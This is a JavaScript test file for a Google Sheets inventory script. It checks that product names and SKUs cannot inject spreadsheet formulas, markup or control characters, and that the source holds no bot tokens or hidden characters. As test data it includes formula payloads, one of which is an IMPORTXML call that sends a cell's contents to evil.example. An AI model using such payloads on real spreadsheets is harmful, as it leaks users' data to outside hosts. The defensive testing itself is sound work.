// Attack tests: what a careless or hostile person can type into the sheet, and what the script does.
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const S = require("../src/sheets.js");
const { FakeSpreadsheet, FakeProps, fakeFetch } = require("./fake-sheets.js");

const NOW = new Date(2030, 0, 20);

function sheetWith(products, moves) {
  return new FakeSpreadsheet("Склад", { "Товары": [S.HEAD.products, ...products], "Движение": [S.HEAD.moves, ...moves] });
}

test("formula injection in product names never becomes a formula", () => {
  const evil = [
    ['=IMPORTXML("http://evil.example/?d="&A1;"//a")', "x"],
    ['=HYPERLINK("http://evil.example","Нажми")', "x"],
    ["+1+1", "x"], ["-2+3", "x"], ["@SUM(A1:A9)", "x"],
  ];
  const ss = sheetWith(evil.map(([name], i) => ["E" + i, name, "шт", 1, 1]),
    [["01.01.2030", "E0", "приход", 1, "=1+1"]]);
  S.runRecalc(ss, NOW);
  S.runMonthReport(ss, NOW, 2030, 1);
  assert.deepEqual(ss.allFormulas(), []);
  const names = ss.getSheetByName("Остатки").table().slice(1).map((r) => r[1]);
  assert.ok(names[0].startsWith("=IMPORTXML")); // stored as visible text, not executed
});

test("formula injection through the error message (bad SKU text) is neutralised", () => {
  const ss = sheetWith([["A", "Товар", "шт", 0, 0]], [["01.01.2030", "=CMD()", "приход", 1, ""]]);
  S.runRecalc(ss, NOW);
  assert.deepEqual(ss.allFormulas(), []);
  assert.match(ss.getSheetByName("Ошибки").table()[1][2], /=CMD\(\)/);
});

test("control characters and huge texts are cleaned", () => {
  const name = "Чайник" + String.fromCharCode(0, 27) + "[31m" + "x".repeat(5000);
  const ss = sheetWith([["K1", name, "шт", 0, 0]], []);
  S.runRecalc(ss, NOW);
  const shown = ss.getSheetByName("Остатки").table()[1][1];
  assert.ok(shown.length <= 120 && !/[\u0000-\u001f]/.test(shown));
});

test("absurd numbers cannot break the totals", () => {
  const ss = sheetWith([["A", "Товар", "шт", 0, 1]], [
    ["01.01.2030", "A", "приход", "1e308", ""], ["01.01.2030", "A", "приход", "Infinity", ""],
    ["01.01.2030", "A", "приход", -5, ""], ["01.01.2030", "A", "приход", "5000001", ""],
    ["01.01.2030", "A", "приход", 3, ""]]);
  const res = S.runRecalc(ss, NOW);
  assert.equal(res.stock[0].qty, 3);
  assert.equal(res.errors.length, 4);
});

test("telegram text from cells cannot inject markup or hit another host", () => {
  const fetch = fakeFetch();
  const ss = sheetWith([["A", '<a href="http://evil">тык</a>', "шт", 5, 0]], [["01.01.2030", "A", "приход", 1, ""]]);
  S.runDailyCheck(ss, NOW, new FakeProps({ TG_TOKEN: "123456789:" + "A".repeat(35), TG_CHAT_ID: "42" }), fetch);
  assert.equal(fetch.calls.length, 1);
  assert.ok(fetch.calls[0].url.startsWith("https://api.telegram.org/bot"));
  assert.equal(fetch.calls[0].body.parse_mode, undefined);
});

test("no secrets or hidden characters in the source", () => {
  for (const f of ["core.js", "sheets.js", "appsscript.json"]) {
    const src = fs.readFileSync(path.join(__dirname, "..", "src", f), "utf8");
    assert.ok(!/\d{8,}:[A-Za-z0-9_-]{30,}/.test(src), f + ": looks like a bot token");
    for (const ch of src) {
      const c = ch.codePointAt(0);
      const hidden = (c < 32 && c !== 10 && c !== 13) || (c >= 0x200b && c <= 0x200f) ||
        (c >= 0x202a && c <= 0x202e) || (c >= 0x2066 && c <= 0x2069) || c === 0xa0;
      assert.ok(!hidden, f + ": hidden character U+" + c.toString(16));
    }
  }
});
